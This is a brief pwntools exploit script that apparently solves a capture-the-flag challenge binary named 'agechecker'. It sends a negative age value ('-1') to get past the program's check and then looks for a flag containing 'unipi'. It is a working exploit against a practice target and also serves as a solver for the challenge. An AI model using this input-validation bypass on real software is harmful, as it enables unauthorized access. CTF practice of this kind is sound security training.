#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'agechecker')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

io.sendlineafter(b":\n", b"a")
io.sendlineafter(b":\n", b"-1")
io.recvline()
flag = io.recvline()

if(b"unipi" in flag):
    print("Got flag")
    exit(0)

print("ERR - Flag not found running exp")
exit(1)